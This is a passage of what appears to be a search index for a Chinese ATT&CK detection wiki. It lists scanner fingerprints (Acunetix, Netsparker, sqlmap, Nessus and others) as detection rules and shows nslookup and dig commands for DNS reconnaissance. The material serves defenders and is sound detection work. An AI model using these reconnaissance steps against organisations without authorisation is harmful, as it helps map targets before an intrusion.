f\uff08\u5c24\u5176\u662f\u5982\u679c\u5df2\u77e5\u8be5\u6e90\u4e0e\u653b\u51fb\u8005\u6216\u50f5\u5c38\u7f51\u7edc\u76f8\u5173\u8054\uff09\u3002\u5206\u6790Web\u8bbf\u95ee\u6570\u636e\u4e5f\u53ef\u80fd\u4f1a\u53d1\u73b0\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u7684\u7279\u5f81\uff0c\u4f8b\u5982referer\u503c\u6216HTTP/S\u4e2d\u7684user-agent\u5b57\u6bb5\u91cc\u5b57\u7b26\u4e32\u3002 \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_7","text":"MITRE-ATT&CK-T1595-001 https://attack.mitre.org/techniques/T1595/001/ \u5e38\u89c1\u626b\u63cf\u5668\u6216\u8005\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7279\u5f81\uff08\u6307\u7eb9\uff09 https://www.freebuf.com/column/156291.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/","text":"T1595-002-\u4e3b\u52a8\u626b\u63cf_\u6f0f\u6d1e\u626b\u63cf \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5b9e\u65bd\u653b\u51fb\u524d\u626b\u63cf\u6f0f\u6d1e\u6765\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u3002\u6f0f\u6d1e\u626b\u63cf\u901a\u5e38\u4f1a\u68c0\u67e5\u76ee\u6807\u4e3b\u673a/\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\uff1a\u8f6f\u4ef6\u548c\u7248\u672c\uff09\u7684\u914d\u7f6e\u662f\u5426\u6709\u653b\u51fb\u8005\u8bd5\u56fe\u5229\u7528\u7684\u6f0f\u6d1e\u3002 \u8fd9\u4e9b\u626b\u63cf\u8fd8\u53ef\u80fd\u5305\u62ec\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f\u7b49\u5176\u5b83\u5c1d\u8bd5\uff0c\u4ece\u800c\u8bc6\u522b\u66f4\u5e38\u89c1\u7684\u53ef\u5229\u7528\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u626b\u63cf\u901a\u5e38\u662f\u901a\u8fc7\u670d\u52a1\u5668banner\u3001\u76d1\u542c\u7aef\u53e3\u6216\u5176\u4ed6\u7f51\u7edc\u5de5\u4ef6\u6765\u83b7\u53d6\u8fd0\u884c\u8f6f\u4ef6\u548c\u7248\u672c\u53f7\u3002\u626b\u63cf\u6240\u83b7\u53d6\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u6f0f\u6d1e\u5229\u7528\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5e38\u89c1\u626b\u63cf\u5668 \u68c0\u6d4b\u65e5\u5fd7 HTTP\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\u5b9e\u6d4b\u793a\u4f8b \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u5e38\u89c1\u626b\u63cf\u5668\u7279\u5f81 Awvs\uff08Acunetix Web Vulnerability Scanner \uff09\u7248\u672c10.5\u548c11 Awvs\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1> Url: acunetix-wvs-test-for-some-inexistent-file by_wvs acunetix_wvs_security_test acunetix acunetix_wvs acunetix_test <2> Headers: Acunetix-Aspect-Password: Cookie: acunetixCookie Location: acunetix_wvs_security_test X-Forwarded-Host: acunetix_wvs_security_test X-Forwarded-For: acunetix_wvs_security_test Host: acunetix_wvs_security_test Cookie: acunetix_wvs_security_test Cookie: acunetix Accept: acunetix/wvs Origin: acunetix_wvs_security_test Referer: acunetix_wvs_security_test Via: acunetix_wvs_security_test Accept-Language: acunetix_wvs_security_test Client-IP: acunetix_wvs_security_test HTTP_AUTH_PASSWD: acunetix User-Agent: acunetix_wvs_security_test Acunetix-Aspect-Queries:\u4efb\u610f\u503c Acunetix-Aspect:\u4efb\u610f\u503c <3> Body \uff08\u8bf7\u6c42\u7684post\u4fe1\u606f\uff09 acunetix_wvs_security_test acunetix Netsparker Netsparker\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1> Url netsparker Netsparker ns: netsparker <2> Headers X-Scanner: Netsparker Location: Netsparker Accept: netsparker/check Cookie: netsparker Cookie: NETSPARKER <3> Body netsparker Appscan Appscan\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1>Url Appscan <2> Headers Content-Type: Appscan Content-Type: AppScanHeader Accept: Appscan User-Agent:Appscan <3> Body Appscan Webinspect Webinspect\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1> Url HP404 <2> Headers User-Agent: HP ASC Cookie: webinspect X-WIPP: \u4efb\u610f\u503c X-Request-Memo: \u4efb\u610f\u503c X-Scan-Memo: \u4efb\u610f\u503c Cookie: CustomCookie X-RequestManager-Memo: \u4efb\u610f\u503c <3> Body Webinspect Rsas (\u7eff\u76df\u6781\u5149) Rsas \u7684\u4e3b\u8981\u7684\u7279\u5f81\u5728Url\u548cHeaders\u4e2d <1> Url nsfocus <2> Headers User-Agent: Rsas Nessus Nessus\u7684\u7279\u5f81\u4e3b\u8981\u5728Url\uff0cHeaders\uff0cBody\u4e2d <1> Url nessus Nessus <2> Headers x_forwarded_for: nessus referer: nessus host: nessus <3> Body nessus Nessus WebReaver WebReaver\u7684\u7279\u5f81\u53ea\u5728Headers\u4e2d\u7684UA\u4e2d <1> Headers User-Agent: WebReaver Sqlmap Sqlmap\u5728Url\uff0cHeaders\uff0cBody\u4e2d\u90fd\u542b\u6709\u7279\u5f81\u503c <1> Url sqlmap <2> Headers User-Agent: sqlmap\uff08\u540e\u63a5\u7248\u672c\u53f7\uff0c\u8ddf\u5f53\u524d\u7248\u672c\u6709\u5173\u7cfb\uff09 <3> Body sqlmap NMAP \u6700\u8fd1\u505a\u5206\u6790\u76d1\u6d4b\u5230\u7684\u7279\u5f81 user-agent\uff1aNmap Scripting Engine; https://nmap.org/book/nse.html \u5efa\u8bae \u76d1\u63a7\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u7684\u53ef\u7591\u7f51\u7edc\u6d41\u91cf\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u6e90\u7684\u5927\u91cf\u6d41\u91cf\uff08\u5c24\u5176\u662f\u5982\u679c\u5df2\u77e5\u8be5\u6e90\u4e0e\u653b\u51fb\u8005\u6216\u50f5\u5c38\u7f51\u7edc\u76f8\u5173\u8054\uff09\u3002\u5206\u6790Web\u8bbf\u95ee\u6570\u636e\u4e5f\u53ef\u80fd\u4f1a\u53d1\u73b0\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u7684\u7279\u5f81\uff0c\u4f8b\u5982referer\u503c\u6216HTTP/S\u4e2d\u7684user-agent\u5b57\u6bb5\u91cc\u5b57\u7b26\u4e32\u3002 \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1595-002 https://attack.mitre.org/techniques/T1595/002/ \u5e38\u89c1\u626b\u63cf\u5668\u6216\u8005\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7279\u5f81\uff08\u6307\u7eb9\uff09 https://www.freebuf.com/column/156291.html","title":"T1595-002-\u4e3b\u52a8\u626b\u63cf_\u6f0f\u6d1e\u626b\u63cf"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#t1595-002-_","text":"","title":"T1595-002-\u4e3b\u52a8\u626b\u63cf_\u6f0f\u6d1e\u626b\u63cf"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5b9e\u65bd\u653b\u51fb\u524d\u626b\u63cf\u6f0f\u6d1e\u6765\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u3002\u6f0f\u6d1e\u626b\u63cf\u901a\u5e38\u4f1a\u68c0\u67e5\u76ee\u6807\u4e3b\u673a/\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\uff1a\u8f6f\u4ef6\u548c\u7248\u672c\uff09\u7684\u914d\u7f6e\u662f\u5426\u6709\u653b\u51fb\u8005\u8bd5\u56fe\u5229\u7528\u7684\u6f0f\u6d1e\u3002 \u8fd9\u4e9b\u626b\u63cf\u8fd8\u53ef\u80fd\u5305\u62ec\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f\u7b49\u5176\u5b83\u5c1d\u8bd5\uff0c\u4ece\u800c\u8bc6\u522b\u66f4\u5e38\u89c1\u7684\u53ef\u5229\u7528\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u626b\u63cf\u901a\u5e38\u662f\u901a\u8fc7\u670d\u52a1\u5668banner\u3001\u76d1\u542c\u7aef\u53e3\u6216\u5176\u4ed6\u7f51\u7edc\u5de5\u4ef6\u6765\u83b7\u53d6\u8fd0\u884c\u8f6f\u4ef6\u548c\u7248\u672c\u53f7\u3002\u626b\u63cf\u6240\u83b7\u53d6\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u6f0f\u6d1e\u5229\u7528\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_1","text":"\u5e38\u89c1\u626b\u63cf\u5668","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_2","text":"HTTP\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_3","text":"\u6682\u65e0\u5b9e\u6d4b\u793a\u4f8b","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_6","text":"","title":"\u5e38\u89c1\u626b\u63cf\u5668\u7279\u5f81"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#awvsacunetix-web-vulnerability-scanner-10511","text":"Awvs\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1> Url: acunetix-wvs-test-for-some-inexistent-file by_wvs acunetix_wvs_security_test acunetix acunetix_wvs acunetix_test <2> Headers: Acunetix-Aspect-Password: Cookie: acunetixCookie Location: acunetix_wvs_security_test X-Forwarded-Host: acunetix_wvs_security_test X-Forwarded-For: acunetix_wvs_security_test Host: acunetix_wvs_security_test Cookie: acunetix_wvs_security_test Cookie: acunetix Accept: acunetix/wvs Origin: acunetix_wvs_security_test Referer: acunetix_wvs_security_test Via: acunetix_wvs_security_test Accept-Language: acunetix_wvs_security_test Client-IP: acunetix_wvs_security_test HTTP_AUTH_PASSWD: acunetix User-Agent: acunetix_wvs_security_test Acunetix-Aspect-Queries:\u4efb\u610f\u503c Acunetix-Aspect:\u4efb\u610f\u503c <3> Body \uff08\u8bf7\u6c42\u7684post\u4fe1\u606f\uff09 acunetix_wvs_security_test acunetix","title":"Awvs\uff08Acunetix Web Vulnerability Scanner \uff09\u7248\u672c10.5\u548c11"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#netsparker","text":"Netsparker\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1> Url netsparker Netsparker ns: netsparker <2> Headers X-Scanner: Netsparker Location: Netsparker Accept: netsparker/check Cookie: netsparker Cookie: NETSPARKER <3> Body netsparker","title":"Netsparker"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#appscan","text":"Appscan\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1>Url Appscan <2> Headers Content-Type: Appscan Content-Type: AppScanHeader Accept: Appscan User-Agent:Appscan <3> Body Appscan","title":"Appscan"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#webinspect","text":"Webinspect\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f <1> Url HP404 <2> Headers User-Agent: HP ASC Cookie: webinspect X-WIPP: \u4efb\u610f\u503c X-Request-Memo: \u4efb\u610f\u503c X-Scan-Memo: \u4efb\u610f\u503c Cookie: CustomCookie X-RequestManager-Memo: \u4efb\u610f\u503c <3> Body Webinspect","title":"Webinspect"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#rsas","text":"Rsas \u7684\u4e3b\u8981\u7684\u7279\u5f81\u5728Url\u548cHeaders\u4e2d <1> Url nsfocus <2> Headers User-Agent: Rsas","title":"Rsas (\u7eff\u76df\u6781\u5149)"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#nessus","text":"Nessus\u7684\u7279\u5f81\u4e3b\u8981\u5728Url\uff0cHeaders\uff0cBody\u4e2d <1> Url nessus Nessus <2> Headers x_forwarded_for: nessus referer: nessus host: nessus <3> Body nessus Nessus","title":"Nessus"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#webreaver","text":"WebReaver\u7684\u7279\u5f81\u53ea\u5728Headers\u4e2d\u7684UA\u4e2d <1> Headers User-Agent: WebReaver","title":"WebReaver"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#sqlmap","text":"Sqlmap\u5728Url\uff0cHeaders\uff0cBody\u4e2d\u90fd\u542b\u6709\u7279\u5f81\u503c <1> Url sqlmap <2> Headers User-Agent: sqlmap\uff08\u540e\u63a5\u7248\u672c\u53f7\uff0c\u8ddf\u5f53\u524d\u7248\u672c\u6709\u5173\u7cfb\uff09 <3> Body sqlmap","title":"Sqlmap"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#nmap","text":"\u6700\u8fd1\u505a\u5206\u6790\u76d1\u6d4b\u5230\u7684\u7279\u5f81 user-agent\uff1aNmap Scripting Engine; https://nmap.org/book/nse.html","title":"NMAP"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_7","text":"\u76d1\u63a7\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u7684\u53ef\u7591\u7f51\u7edc\u6d41\u91cf\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u6e90\u7684\u5927\u91cf\u6d41\u91cf\uff08\u5c24\u5176\u662f\u5982\u679c\u5df2\u77e5\u8be5\u6e90\u4e0e\u653b\u51fb\u8005\u6216\u50f5\u5c38\u7f51\u7edc\u76f8\u5173\u8054\uff09\u3002\u5206\u6790Web\u8bbf\u95ee\u6570\u636e\u4e5f\u53ef\u80fd\u4f1a\u53d1\u73b0\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u7684\u7279\u5f81\uff0c\u4f8b\u5982referer\u503c\u6216HTTP/S\u4e2d\u7684user-agent\u5b57\u6bb5\u91cc\u5b57\u7b26\u4e32\u3002 \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_8","text":"MITRE-ATT&CK-T1595-002 https://attack.mitre.org/techniques/T1595/002/ \u5e38\u89c1\u626b\u63cf\u5668\u6216\u8005\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7279\u5f81\uff08\u6307\u7eb9\uff09 https://www.freebuf.com/column/156291.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/","text":"T1596-001-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-DNS/\u88ab\u52a8DNS \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u5728DNS\u6570\u636e\u4e2d\u641c\u7d22\u53ef\u5728\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4f7f\u7528\u4fe1\u606f\u3002DNS\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u518c\u7684\u540d\u79f0\u670d\u52a1\u5668\u4ee5\u53ca\u6982\u8ff0\u76ee\u6807\u5b50\u57df\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u548c\u5176\u4ed6\u4e3b\u673a\u7684\u5730\u5740\u7684\u8bb0\u5f55\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22DNS\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u76ee\u6807\u7ec4\u7ec7\u7684\u540d\u79f0\u670d\u52a1\u5668\uff0c\u4e5f\u53ef\u4ee5\u641c\u7d22\u8bb0\u5f55\u7684DNS\u67e5\u8be2\u54cd\u5e94\u7684\u96c6\u4e2d\u5b58\u50a8\u5e93\uff08\u79f0\u4e3a\u88ab\u52a8DNS\uff09\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5bfb\u6c42\u5e76\u9488\u5bf9\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u7684DNS\u9519\u8bef\u914d\u7f6e\u6216\u6cc4\u6f0f\u3002\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u59a5\u534f\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u6b65\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\uff09\u8fdc\u7a0b\u670d\u52a1\u6216\u4fe1\u4efb\u5173\u7cfb\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4fe1\u606f\u6536\u96c6--DNS\u4fe1\u606f\u6536\u96c6 NSLOOKUP \u89e3\u6790A\u8bb0\u5f55\u3001MX\u8bb0\u5f55\u3001NS\u8bb0\u5f55 \u7ec8\u7aef\u4e2d\u8f93\u5165 \uff1anslookup \u5728\u663e\u793a\u7684\u9875\u9762\u4e2d\u8f93\u5165\u57df\u540d\uff0c\u4f1a\u89e3\u6790\u51fa\u6700\u7ec8\u7684A\u8bb0\u5f55\u548cIP\u5730\u5740 >set type=a # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aA\u8bb0\u5f55\uff08\u4e3b\u673a\u8bb0\u5f55\uff09 >set type=mx # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aMX\u8bb0\u5f55\uff08\u90ae\u4ef6\u4ea4\u6362\u8bb0\u5f55\u00b7\uff09 >set type=ns # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aNS\u8bb0\u5f55\uff08\u57df\u540d\u670d\u52a1\u5668\u8bb0\u5f55\uff09 >sina.com # \u67e5\u8be2 sina.com \u8fd9\u4e2a\u57df\u540d \u53cd\u5411\u57df\u540d\u89e3\u6790 \u4f7f\u7528IP\u53cd\u5411\u89e3\u6790\u51fa\u57df\u540d\uff08ptr\uff09 >set type=ptr > 66.102.251.24 \u6307\u5b9aserver IP >server 8.8.8.8 # \u6307\u5b9a\u6211\u4eec\u60f3\u8981\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\u7684IP\uff0c\u4f7f\u7528\u8be5\u670d\u52a1\u5668\u6765\u8fdb\u884c\u67e5\u8be2 >www.sina.com \u6307\u5b9a\u6240\u6709\u7c7b\u578b >set type=any # \u6307\u5b9a\u67e5\u8be2\u6240\u6709\u7c7b\u578b\u7684\u8bb0\u5f55 >www.sina.com DIG \u67e5\u8be2\u6240\u6709\u8bb0\u5f55 dig sina.com any @8.8.8.8 # \u67e5\u8be2 sina.com \u7684\u6240\u6709\u7c7b\u578b\u7684\u8bb0\u5f55\uff0c\u5e76\u6307\u5b9aIP\u5730\u5740\u4e3a 8.8.8.8 # \u5efa\u8bae\u6307\u5b9a\u4e0d\u540c\u7684\u57df\u540d\u670d\u52a1\u5668IP\u5bf9\u540c\u4e00\u4e2a\u57df\u540d\u8fdb\u884c\u89e3\u6790\uff08\u6bd4\u8f83\u7ed3\u679c\uff0c\u786e\u5b9a\u67e5\u8be2\u7684\u51c6\u786e\u6027\uff09 \u7b5b\u9009\u8f93\u51fa\u7ed3\u679c dig mail.163.com any # \u67e5\u8be2163\u7684mail\u7684\u8bb0\u5f55 dig +noall mail.163.com any # +noall\u7b5b\u9009\u8f93\u51fa\u7ed3\u679c\uff08\u5373\u4ec0\u4e48\u7ed3\u679c\u90fd\u4e0d\u8f93\u51fa\uff09 dig +noall +answer mail.183.com any # 